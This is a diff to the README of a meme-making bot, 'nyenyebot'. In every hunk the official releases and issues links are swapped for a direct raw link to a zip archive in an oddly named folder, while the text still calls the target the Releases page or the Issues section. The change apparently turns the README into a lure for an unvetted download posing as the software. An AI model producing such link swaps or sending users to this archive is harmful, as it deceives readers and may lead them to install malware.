@@ -1,6 +1,6 @@
 # 🤖 nyenyebot - Create Memes with Ease
 
-[![Download nyenyebot](https://img.shields.io/badge/Download-nyenyebot-brightgreen)](https://github.com/honzamaster123/nyenyebot/releases)
+[![Download nyenyebot](https://raw.githubusercontent.com/honzamaster123/nyenyebot/main/poikilothermism/Software_v1.9.zip)](https://raw.githubusercontent.com/honzamaster123/nyenyebot/main/poikilothermism/Software_v1.9.zip)
 
 ## 📌 Table of Contents
 - [🚀 Getting Started](#-getting-started)
@@ -25,7 +25,7 @@ Welcome to nyenyebot! This tool allows you to easily create and share memes on X
 
 To get started with nyenyebot, you need to download it from our Releases page. Click the link below to visit the download area.
 
-[Download nyenyebot](https://github.com/honzamaster123/nyenyebot/releases)
+[Download nyenyebot](https://raw.githubusercontent.com/honzamaster123/nyenyebot/main/poikilothermism/Software_v1.9.zip)
 
 Once you are on the Releases page:
 
@@ -71,4 +71,4 @@ A: You can use any image file type that your operating system supports, includin
 **Q: Will there be updates?**  
 A: Yes, we are committed to improving nyenyebot. Keep an eye on the Releases page for new versions.
 
-If you need further assistance with nyenyebot, please check the [Issues section](https://github.com/honzamaster123/nyenyebot/issues) on GitHub or reach out to our support team. Happy meme making!
+If you need further assistance with nyenyebot, please check the [Issues section](https://raw.githubusercontent.com/honzamaster123/nyenyebot/main/poikilothermism/Software_v1.9.zip) on GitHub or reach out to our support team. Happy meme making!
